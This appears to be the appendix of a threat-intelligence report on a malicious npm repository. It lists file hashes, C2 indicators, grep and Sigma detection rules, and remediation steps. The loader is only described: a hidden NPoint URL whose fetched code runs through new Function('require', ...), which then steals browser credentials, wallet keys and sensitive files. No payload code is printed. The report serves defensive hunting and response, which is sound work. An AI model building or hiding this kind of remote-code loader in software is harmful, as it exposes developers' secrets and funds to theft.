Hashes are included for independent comparison with repository mirrors, NPoint captures, decoded payloads, and derived exhibits. Artifact labels are publication-safe; the private evidence tree is not distributed with this report.

| SHA-256 | Filename / Artifact | Notes |
|---|---|---|
| `16797a357c3606a6d42583dad6af2aef96eddf24df4772345af672010684f96e` | `package.json` | Project scripts; `server`, `start`, and `dev` launch backend |
| `feea9d5d2b8de190ed4ccab39813c04f84cc90616edabf5af447c4d9d826917f` | `package-lock.json` | Dependency lockfile |
| `993a449867f675b3b478c323fbe4d49789ed697e235fe034f2422b2504c7ca73` | `server.js` | Backend entry and API route loading |
| `a32d31464f300a212453869270466890a1140d434bb86c3cab7bc38aecbed13f` | `server/server.js` | Alternate/backend entry and API route loading |
| `703b8249b5905cbdd46521d0beb084ce26039c3ab74cc4c3099cb3901568cb5b` | `server/routes/api/auth.js` | Imports authentication middleware |
| `030b71b0f42b39e8f40f96df3a0c7aa55d81c9c1f51ea769d1a468118f5952c2` | `server/routes/api/posts.js` | Imports authentication middleware |
| `bee5c35f7957ac6281161c6440fb36bd04da9941173a3bbd494765c72a8a8749` | `server/routes/api/profile.js` | Imports authentication middleware |
| `5e3d903ca448f9556646a4f65ff4c5a45a0f15f07cdc4577f53fc2ca16fc393d` | `server/routes/api/users.js` | Imports authentication middleware |
| `9ea4138ab7ed0bb49b323652d9258d4dedec6e59318a897550107741f5e01b2d` | `server/middleware/auth.js` | Imports `getContract.js`; invokes `callHashedContract()` |
| `6f006d32762ae7914d38f3e01e660f7f4b9ab1d72f7b553d8b85f963732eee08` | `server/config/constant.js` | Contains NPoint URL hidden among RPC constants |
| `a816fe1bf50646eb8555253517c77c211ce8ccc13cacdc88261e54213bd28123` | `server/config/getContract.js` | Retrieves NPoint and executes `cookie` through Function constructor |
| `bdd7c1bdb1a6f4d668cf168af2cd7176851c68d9245061d320a624d7ee9197eb` | `Malicious-path file hash inventory` | Contains SHA-256 values for the exact repository files in the execution chain; row-level file hashes are listed individually above |
| `87b53700fec2459e739bf3f3910fb8de6dc802338e7aa0151e04be04377b5ac5` | `Line-level execution-chain exhibit` | Exact line-level chain from `package.json` through `callHashedContract()` and `new Function('require', ...)` |
| `47f65e12b207950a065b4873a2566d75709bb4ca482081718046df4a0cf111c9` | `npm/import-chain summary` | Corrected worktree selection and full marker-context output |
| `aba6e77e571eb8fb8cf44f7165bc24b37a087329e75dd11b55bc06f460bd0e6b` | `Socket.IO event inventory` | Extracted inbound/outbound Socket.IO event names |
| `4315291944acb9b0b847a5bf8f4806620f6d1ac53949509bdf70a5eb125551d5` | `PTR lookup for 144.172.89[.]180` | Reverse DNS enrichment artifact |
| `53d70e8ca5db3c59fe38eda75828aeab8f017fc64aa938a3fefd3047b6346c29` | `RDAP enrichment for 144.172.89[.]180` | RouterHosting/Cloudzy infrastructure context |
| `2db3988ace71046d9fc84e8e5f77c2993fe8022ff31bcaf31a6dc048828209af` | `WHOIS enrichment for 144.172.89[.]180` | ARIN WHOIS infrastructure context |
| `ad1ccb6d5d5df352e37ffb284acfb57cdab293a3a4378e77ff4c859006cf0120` | NPoint stage capture | Obfuscated JavaScript payload |
| `e3b7d6378c7349d7274ae895637746abbea13c0dfc6b109c62b6e860fa61246a` | `stage1-cookie-obfuscated.js` | Extracted obfuscated cookie body |
| `3d7541bfc7ec43e1fea063ff29922a517303afb416223ba00020c8e26b4fabda` | `ldb-browser-collector.js` | Browser/wallet collector |
| `ea7d02d42307a5411fea9f9a1f6acc0b125a21584b6e88aa8a55fccec533f574` | `auto-file-uploader.js` | Sensitive-file scanner/uploader |
| `614a9e2ae73d072e66f08e59cd84ffd985ad73faa07a85df3210358e1709209f` | `socket-controller.js` | Socket.IO command controller |
| `b352252e642e10139722e9056fd7274cccf37e039824e86d66d9482270c8d17a` | `github_estokkyam_estokkyam_20260506T141830Z.tar.gz` | Preserved repository archive |
| `9aed22d6334a62782a0fd4b265ff1fc5b32a1d9a0ba64621264d9c3f3616c75e` | `estokkyam_estokkyam_commits.txt` | Preserved commit metadata |

### Host Artifacts and Runtime Markers

```text
server/config/constant.js
server/config/getContract.js
server/middleware/auth.js
api.npoint.io/d5cceef8fa81cee50c7b
ukey: 303
t: 3
303_<hostname>
SuperStr0ngSecret@)@^
pid.3.1.lock
pid.3.2.lock
pid.3.3.lock
```

### Suspicious Process Patterns

```text
node server
npm-run-all --parallel kill-port server client
node -
node -e
powershell
child_process.exec()
new Function('require', <remote-code>)
socket.io-client connection to ws[:]//144.172.89[.]180:8087
```

---

## Detection and Hunting Guidance

### Repository / Source-Code Hunting

Search unfamiliar repositories for hidden Function-constructor execution sinks:

```bash
grep -RInE "new Function|Function\\('require'|eval\\(|axios\\.get\\(|api\\.npoint\\.io" .
```

Search for NPoint URLs hidden among configuration constants:

```bash
grep -RInE "api\\.npoint\\.io|npoint|cookie|Hashed" server config src .
```

Search npm scripts for backend startup behavior:

```bash
jq '.scripts' package.json
```

### Network Detection

Alert on Node.js processes connecting to:

```text
api.npoint[.]io
144.172.89[.]180:8085
144.172.89[.]180:8086
144.172.89[.]180:8087
```

Relevant URI paths:

```text
/d5cceef8fa81cee50c7b
/upload
/api/upload-file
/api/log
/api/notify
```

### Example Sigma-Style Logic

Potential Function-constructor staging in Node.js source:

```yaml
title: Node.js Remote Code Execution Through Function Constructor
status: experimental
logsource:
  category: file_event
detection:
  selection:
    TargetFilename|endswith:
      - ".js"
    Content|contains:
      - "new Function"
      - "Function('require'"
      - "res.data.cookie"
      - "api.npoint.io"
  condition: selection
level: high
```

Potential Node.js C2 to Estokkyam infrastructure:

```yaml
title: Node.js Process Connecting to Estokkyam C2 Infrastructure
status: experimental
logsource:
  category: network_connection
detection:
  selection:
    Image|endswith:
      - "/node"
      - "\\node.exe"
    DestinationIp: "144.172.89[.]180"
    DestinationPort:
      - 8085
      - 8086
      - 8087
  condition: selection
level: high
```

Potential Socket.IO control-channel behavior:

```yaml
title: Suspicious Socket.IO C2 From Node.js Process
status: experimental
logsource:
  category: proxy
detection:
  selection:
    c-uri|contains:
      - "/socket.io/"
    DestinationIp: "144.172.89[.]180"
  condition: selection
level: high
```

---

## Remediation

### If You Only Viewed the Repository

1. Do not run the project.
2. Preserve the repository URL, Google Doc URL, and local clone for evidence.
3. Do not run `npm install`, `npm start`, `npm run dev`, or backend scripts.
4. Inspect `package.json`, `server/config/constant.js`, `server/config/getContract.js`, and `server/middleware/auth.js`.

### If You Ran `npm start` or `npm run dev`

1. Disconnect the host from the network.
2. Preserve process, network, shell, npm, and filesystem telemetry.
3. Assume browser credentials, wallet files, `.env` files, SSH keys, API keys, and local project secrets may be compromised.
4. Rotate credentials from a clean machine.
5. Move cryptocurrency funds from wallets that were present on the host.
6. Audit GitHub, GitLab, Bitbucket, cloud providers, npm, exchanges, and wallet activity.
7. Search for Node child processes, lock files, unexpected PowerShell processes, and outbound traffic to `144.172.89[.]180`.
8. Reimage once evidence preservation is complete if payload execution is confirmed.

### Account and Secret Response

Prioritize:

```text
browser-stored credentials
cryptocurrency wallet seed/private keys
.env and .env.local files
SSH keys
Git credentials and tokens
cloud provider keys
npm tokens
API keys
password database files
```

---

## Evidence Availability

The underlying evidence archive is not distributed with this public report. Public comparison material is provided through repository identifiers, commit metadata, hashes, URLs, endpoint paths, command protocol details, and behavioral descriptions.

Preserved evidence includes repository metadata, selected source files, NPoint capture headers/body/trace/writeout/log, decoded payloads, decoder script, socket protocol analysis, and hash manifests.

### Potential Additional Evidence

Additional evidence that would strengthen the public report includes: the Google Doc lure export, Bitbucket page metadata or screenshots, historical/passive DNS for `144.172.89[.]180`, C2 service fingerprints for ports `8085`, `8086`, and `8087`, and a repeat NPoint capture showing whether the hosted payload has changed or been removed. Commands for collecting these artifacts are provided separately in the enrichment command file.

## Collection and Analysis Boundaries

This report is based on static analysis and controlled retrieval. No recovered payload was executed on a real analyst workstation. The NPoint payload was deobfuscated using a safe extraction workflow that treats the payload as data and stubs dangerous runtime behavior. C2 probing, if performed, should be passive or tightly controlled and should never submit real host, browser, wallet, or file material. Further behavioral analysis should be performed only in a disposable, instrumented VM with controlled outbound network access.

*TLP:CLEAR. This report may be freely shared. Attribution assessments are tentative and based on observed infrastructure, payload behavior, and TTP similarity. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-012 | Published: 2026-05-06 | Author: ThreatProphet*
